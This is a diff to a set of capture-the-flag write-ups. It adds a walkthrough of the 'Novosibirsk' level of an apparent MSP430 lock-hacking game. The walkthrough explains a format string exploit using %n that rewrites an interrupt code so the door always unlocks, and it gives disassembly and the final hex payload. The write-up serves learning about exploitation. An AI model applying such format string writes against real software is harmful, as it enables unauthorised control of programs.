@@ -12,6 +12,7 @@
 - [Santa Cruz](#santa-cruz)
 - [Jakarta](#jakarta)
 - [Addis Ababa](#addis-ababa)
+- [Novosibirsk](#novosibirsk)
 
 ## Introduction
 
@@ -547,3 +548,73 @@ r12 3482  r13 0002  r14 0000  r15 000a
 ### Solved
 
 password = 7e342578256e
+
+## Novosibirsk
+
+
+Just like the last challenge this one also requires us to do a format string exploit. This time though there is no unlock_door function to call. What we can do is overwrite some code and insert our own using the format string exploit. The question is what. The best thing to overwrite is line 44c6 in the conditional_unlock_door function. This line adds 0x7e to the stack to tell the interrupt function to check if the password is correct. If it is the door will unlock the door. We change overwrite 0x7e and change it to 0x7f, which will unlock the door no matter what. The stack address 44c8 is where 0x7e is located, so we need to add that address to the password string we give, so we can manipulate it. We will start with the password c84478256e25 to see if we change 0x7e. If we add a breakpoint to line 44c6 and see what instruction is there. We can see that it is not "push #0x3", which means we were able to overwrite the 0x7e. Now the problem is how do we insert 0x7f there since the value now is 0x3. That's actually easy we just need to pad the password with bytes till it adds to 0x7f or 127. Since we inserted 3 bytes we need to add 124 more using "A"s. So adding 124 "A"s to our password before the "%n" will solve the challenge.
+
+```asm
+Current Instruction
+3012 0300
+push #0x3
+
+4438 <main>
+4438:  0441           mov	sp, r4
+443a:  2453           incd	r4
+443c:  3150 0cfe      add	#0xfe0c, sp
+4440:  3012 da44      push	#0x44da "Enter your username below to authenticate.\n"
+4444:  b012 c645      call	#0x45c6 <printf>
+4448:  b140 0645 0000 mov	#0x4506 ">> ", 0x0(sp)
+444e:  b012 c645      call	#0x45c6 <printf>
+4452:  2153           incd	sp
+4454:  3e40 f401      mov	#0x1f4, r14
+4458:  3f40 0024      mov	#0x2400, r15
+445c:  b012 8a45      call	#0x458a <getsn>
+4460:  3e40 0024      mov	#0x2400, r14
+4464:  0f44           mov	r4, r15
+4466:  3f50 0afe      add	#0xfe0a, r15
+446a:  b012 dc46      call	#0x46dc <strcpy>
+446e:  3f40 0afe      mov	#0xfe0a, r15
+4472:  0f54           add	r4, r15
+4474:  0f12           push	r15
+4476:  b012 c645      call	#0x45c6 <printf>
+447a:  2153           incd	sp
+447c:  3f40 0a00      mov	#0xa, r15
+4480:  b012 4e45      call	#0x454e <putchar>
+4484:  0f44           mov	r4, r15
+4486:  3f50 0afe      add	#0xfe0a, r15
+448a:  b012 b044      call	#0x44b0 <conditional_unlock_door>
+448e:  0f93           tst	r15
+4490:  0324           jz	#0x4498 <main+0x60>
+4492:  3012 0a45      push	#0x450a "Access Granted!"
+4496:  023c           jmp	#0x449c <main+0x64>
+4498:  3012 1a45      push	#0x451a "That username is not valid."
+449c:  b012 c645      call	#0x45c6 <printf>
+44a0:  0f43           clr	r15
+44a2:  3150 f601      add	#0x1f6, sp
+
+
+44b0 <conditional_unlock_door>
+44b0:  0412           push	r4
+44b2:  0441           mov	sp, r4
+44b4:  2453           incd	r4
+44b6:  2183           decd	sp
+44b8:  c443 fcff      mov.b	#0x0, -0x4(r4)
+44bc:  3e40 fcff      mov	#0xfffc, r14
+44c0:  0e54           add	r4, r14
+44c2:  0e12           push	r14
+44c4:  0f12           push	r15
+44c6:  3012 7e00      push	#0x7e
+44ca:  b012 3645      call	#0x4536 <INT>
+44ce:  5f44 fcff      mov.b	-0x4(r4), r15
+44d2:  8f11           sxt	r15
+44d4:  3152           add	#0x8, sp
+44d6:  3441           pop	r4
+44d8:  3041           ret
+```
+
+### Solved
+
+password = c8444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414178256e25
+
